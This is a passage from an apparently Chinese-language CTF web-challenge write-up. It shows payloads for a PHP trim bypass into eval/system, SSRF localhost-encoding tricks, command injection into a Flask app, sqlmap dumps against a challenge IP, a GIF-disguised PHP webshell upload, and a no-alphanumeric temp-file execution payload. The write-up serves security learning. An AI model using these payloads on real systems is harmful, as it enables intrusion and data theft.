class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>num不等于36，去空后不等于36，经过过滤后等于36<br>主要就是绕过trim<br>trim过滤了 0a 09 0b 没有过滤0c（换页键）可以试试<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667785837693-d65a058c-b327-404b-a057-d4e4a6d5ff2b.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=331&id=ucbc99bf2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53099&status=done&style=none&taskId=ub6f14d95-11d0-42f6-beb3-121893d810e&title=&width=772.8" alt="image.png"><br><strong>?str&#x3D;\\&#x2F;Ilikeisctf&amp;num&#x3D;%0c36&amp;cmd&#x3D;system(‘ls &#x2F;‘);</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667785894235-0be71bb5-14b7-4951-b2b2-3f1626d14506.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=308&id=u70c38254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=385&originWidth=1330&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41991&status=done&style=none&taskId=u6b98a261-bb98-4ef0-85f7-fd9c723b33b&title=&width=1064" alt="image.png"><br><strong>?str&#x3D;\\&#x2F;Ilikeisctf&amp;num&#x3D;%0c36&amp;cmd&#x3D;system(‘tac &#x2F;flag’);</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667785920931-334f4792-e8a7-442d-b9d0-3dadb4ecddc3.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=339&id=u48fb085d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=424&originWidth=1029&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43015&status=done&style=none&taskId=udf9056c1-f687-45e4-b20c-e7795b4e007&title=&width=823.2" alt="image.png"></p>
<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667785970200-a3d8e9e0-daa6-4521-a94e-94f132665d6a.png#clientId=uf7071d46-b4c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=483&id=u5d682960&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=607&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35193&status=done&style=none&taskId=u0ae8cee8-ec97-42ed-ae31-351b9bfb507&title=&width=485.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667822253689-8f238d96-d30e-4a99-a862-7e8385054232.png#clientId=u79929ee8-f7c8-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=432&id=ud18ec5de&margin=%5Bobject%20Object%5D&name=image.png&originHeight=540&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13231&status=done&style=none&taskId=ua519263d-9266-49a0-a14d-c8fbf2a4a83&title=&width=733.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667822239247-f011045c-7d04-4c78-aa2b-6343a2c933eb.png#clientId=u79929ee8-f7c8-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=244&id=ubf3daf82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=305&originWidth=674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13646&status=done&style=none&taskId=uc0681132-71da-4302-983d-b4146ae4822&title=&width=539.2" alt="image.png"><br>IP地址伪造，服务端请求伪造，**?urls&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a>   **<br>这个不行，不能绕过，试一下?urls&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://0.0.0.0/flag.php">http://0/flag.php</a></p>
<blockquote>
<p>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a> 十六进制<br>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a> 八进制 还有一个疑惑就是二进制应该也可以 但是该怎么区分进制呢？<br>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a> 10 进制整数格式 (？？)这什么操作<br>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> 16 进制整数格式</p>
<p>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a><br>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1/flag.php">http://127.0000000000000.001/flag.php</a></p>
<p>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
<p>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a> CIDR</p>
<p>以下为常用绕过方式 但本题不行的解法</p>
<p>短标签绕过<br>ipv6绕过[::1]<br>url&#x3D;<a target="_blank" rel="noopener external nofollow noreferrer" href="http://0.0.0.127/">http://127</a>。0。0。1&#x2F;flag.php 句号<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_52240463/article/details/122659261">参考博客</a></p>
</blockquote>
<h2 id="eazy-onlineshell"><a href="#eazy-onlineshell" class="headerlink" title="eazy-onlineshell"></a>eazy-onlineshell</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667038714918-00891967-1325-4c14-b6ef-6309d0da5cfe.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=514&id=u112d9102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=578&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43811&status=done&style=none&taskId=u9397d83b-6b24-4f88-a815-a457b788917&title=&width=462.4" alt="image.png"><br>根据提示先传个rce<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667038784987-92c3103b-1ecb-4a9c-b705-edc553bebdf8.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=209&id=u48668b72&margin=%5Bobject%20Object%5D&name=image.png&originHeight=261&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12626&status=done&style=none&taskId=uaad47bc2-e683-4bf0-8459-a9794699cac&title=&width=524" alt="image.png"><br>再查看备份文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667038815019-96d094be-df86-4b5c-9596-7e2c962525ab.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=200&id=u901f1a44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=250&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4462&status=done&style=none&taskId=u3c9da4e4-d9dd-452d-9ed9-b756cdec98d&title=&width=658.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667038851975-92886ce5-063f-4074-809e-62f3bea40d5e.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=642&id=uea131209&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1727&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56830&status=done&style=none&taskId=u0515b4b6-3756-47e1-ae6d-52c6359b983&title=&width=1381.6" alt="image.png"><br>查看源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/www.zip&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_SourceCode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:   //访问www.<span class="built_in">zip</span>会打开app.py</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">action_rce</span>():</span><br><span class="line">        <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            action = flask.request.form[<span class="string">&quot;act&quot;</span>]   //在post传入act，写入命令</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(action[<span class="number">1</span>:-<span class="number">1</span>])    //切片，截取第二个和倒数第二个字符之间的</span><br><span class="line">                res = subprocess.run([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">                <span class="comment"># print(res)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以把文件写入app.py中，找不到其他可以利用的目录文件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667039122582-79423764-2cee-438b-ab03-74ec15b60462.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=745&id=u7b60b011&margin=%5Bobject%20Object%5D&name=image.png&originHeight=931&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36563&status=done&style=none&taskId=ud8fd6f09-30fe-4daa-8a9f-c6e63e5355d&title=&width=743.2" alt="image.png"><br>把ls写入app.py   无回显，所以要访问<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.zip执行app.py/">www.zip执行app.py</a><br><strong>act&#x3D;’ls &gt;app.py’</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667039703804-02281c76-eda8-4189-9107-15222eef254d.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=224&id=udb52e243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22018&status=done&style=none&taskId=u90a84168-0e5d-4e57-b29c-6af24329c86&title=&width=613.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667039680632-7528d449-b1c9-4566-a45a-3eb11a65f511.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=630&id=u21ed545a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33444&status=done&style=none&taskId=u25f00d30-e0ca-441d-8e69-1e85ff7d327&title=&width=715.2" alt="image.png"><br>访问flag      ** act&#x3D;’tac flag&gt;app.py’**<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667039908599-8bb4e337-bb5d-4364-bb4b-0dd742b0a8d2.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=744&id=ufc3634c4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=930&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41454&status=done&style=none&taskId=u2b01d82c-ae97-4bd0-b562-9cdce2c26e9&title=&width=822.4" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667039932823-dd06a6ae-2b33-4275-83ee-6d132e1e2277.png#clientId=u789c5546-224c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=617&id=uba345136&margin=%5Bobject%20Object%5D&name=image.png&originHeight=771&originWidth=881&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25654&status=done&style=none&taskId=ua287bef3-66c4-4859-8bda-1eb4f9a8349&title=&width=704.8" alt="image.png"></p>
<h2 id="傻柱"><a href="#傻柱" class="headerlink" title="傻柱"></a>傻柱</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667822740029-e4f9433a-5cef-4a3a-b10f-ce18f8651a55.png#clientId=u79929ee8-f7c8-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=558&id=u45ac260f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=698&originWidth=592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44145&status=done&style=none&taskId=ub857b3e5-47bd-4f54-b525-82132b7ce0c&title=&width=473.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667861970112-310aa174-b5eb-4061-a856-c5ed94d65c65.png#clientId=u0b525e8c-7f72-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=240&id=ub5729fe8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=300&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23654&status=done&style=none&taskId=ua197cc38-6bd0-4341-80e7-17a129707cd&title=&width=696.8" alt="image.png"><br>猜测是sql注入，但是不知道注入类型，登入login页面看一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667862064411-2e8d014c-11ed-4a0a-9681-d8316f2a329c.png#clientId=u0b525e8c-7f72-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=u2e2efbdc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=621&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9546&status=done&style=none&taskId=u03d68a01-f595-448d-bc38-b38ba377438&title=&width=779.2" alt="image.png"><br>没发现什么可以利用的东西<br>burp suite扫一下，发现存在User - Agent注入，（需要等一会，一开始会检测不出来）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667861947966-c2f8c796-b9c7-4ef8-bba3-695576e08db5.png#clientId=u0b525e8c-7f72-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=718&id=u7b6d65c0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=898&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46841&status=done&style=none&taskId=ud40d5ef6-d5c4-4dc4-b5d9-306463bce24&title=&width=616" alt="image.png"><br>sqlmap一把梭<br>针对User - Agent的值探测SQL注入，需要设置 –level值为3<br><strong>sqlmap -u <strong><a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.79.18.34:20177///login.php">http://120.79.18.34:20177///login.php</a></strong> –level 3 –dbs</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667874414170-bb7ef1db-67b6-4800-abcb-c3f1a1ed654a.png#clientId=u7c664ebe-3fae-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=183&id=u8889278f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=229&originWidth=663&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63255&status=done&style=none&taskId=ud67156f3-0105-47ae-a73b-e62cff950a5&title=&width=530.4" alt="image.png"><br><strong>sqlmap -u <strong><a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.79.18.34:20177///login.php"><strong>http://120.79.18.34:20177///login.php</strong></a></strong> –level 3 -D ctf –tables</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667874775158-3797d9f8-10b0-4626-96ab-edf32b872507.png#clientId=u7c664ebe-3fae-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=216&id=uadda2816&margin=%5Bobject%20Object%5D&name=image.png&originHeight=270&originWidth=879&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72995&status=done&style=none&taskId=u0a0b8569-914b-4e34-a110-6fee36de822&title=&width=703.2" alt="image.png"><br><strong>sqlmap -u <strong><a target="_blank" rel="noopener external nofollow noreferrer" href="http://120.79.18.34:20177///login.php"><strong>http://120.79.18.34:20177///login.php</strong></a></strong> –level 3 -D ctf -T user_agents –columns –dump</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667875285499-0b163169-d0b6-487d-afd0-36ad9525debd.png#clientId=u7c664ebe-3fae-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=215&id=u6917bec9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=269&originWidth=791&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77386&status=done&style=none&taskId=u2f6880e6-c4fd-4c86-a2d3-8ba26843d31&title=&width=632.8" alt="image.png"></p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667116650053-e702286e-44a2-4b86-a0b7-0058a642bc74.png#clientId=uc9de2282-e809-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=554&id=u0c5dfa76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=693&originWidth=602&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42226&status=done&style=none&taskId=u78f878de-c933-4603-8e4e-93dfd58d82b&title=&width=481.6" alt="image.png"><br>存在<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.rar文件/">www.rar文件</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667116792841-17c3cd26-8e52-4e26-af55-bdd50f349bae.png#clientId=uc9de2282-e809-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=488&id=ucf205005&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&size=546188&status=done&style=none&taskId=u52f65ddb-5c6c-402e-8697-61465942391&title=&width=938.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667116806942-a3c52823-2e41-46b6-9030-0c2b8ef6695c.png#clientId=uc9de2282-e809-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=386&id=u75e1c89b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=482&originWidth=987&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74140&status=done&style=none&taskId=u5d31bb77-0216-405d-9b52-7b4c9ae32f1&title=&width=789.6" alt="image.png"><br>GIF89a<br><?php eval($_REQUEST['cmd']);?><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667116842466-8aba4184-f230-4a2d-a03f-49e8b824dda2.png#clientId=uc9de2282-e809-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=795&id=ud492cb51&margin=%5Bobject%20Object%5D&name=image.png&originHeight=994&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72082&status=done&style=none&taskId=ubebc227d-2c32-4e5c-b744-a4bb6ac2c77&title=&width=1049.6" alt="image.png"></p>
<h2 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667143511287-0811362e-4b52-4d0b-a30b-28999425d3a0.png#clientId=u3e827917-4729-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=544&id=u2b46fd5d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=610&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40470&status=done&style=none&taskId=uf410c15a-a4f8-4e79-a651-300c271d9ab&title=&width=488" alt="image.png"></p>
<ul>
<li>用post把shell传上服务器，在shell里面写好我们想执行的代码</li>
<li>.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那就可以利用.来执行它</li>
</ul>
<p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p</a><br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">神</a><br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/m0_51078229/article/details/114366053">
</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://120.79.18.34:20176/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667143557679-1cfdc365-0453-4a35-aabe-e4522ba8399b.png#clientId=u3e827917-4729-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=590&id=ud2276ef2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=738&originWidth=1153&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105010&status=done&style=none&taskId=u608e5caf-a787-4716-a374-98432156cb7&title=&width=922.4" alt="image.png"><br><strong>?shell&#x3D;?&gt;<?=`.+/%3F%3F%3F/%3F%3F%3F%3F%3F%3F%3F%3F[%40-[]`%3B?></strong></p>
<h2 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667399205729-7cdc6325-fe80-4d95-99d0-cdc973b78df4.png#clientId=ua12befa2-0f06-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=547&id=u8fded7f6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=684&originWidth=609&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43204&status=done&style=none&taskId=ud5aed4cd-7b20-46cf-a593-3211b480c59&title=&width=487.2" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//flag is in flag.php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  //在需要字符串值的地方会自动调用它进行对象的类型转换</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;  <span class="comment">//c影响b，同时会影响a</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);     <span class="comment">//相当于echo,和tostring一起利用</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span 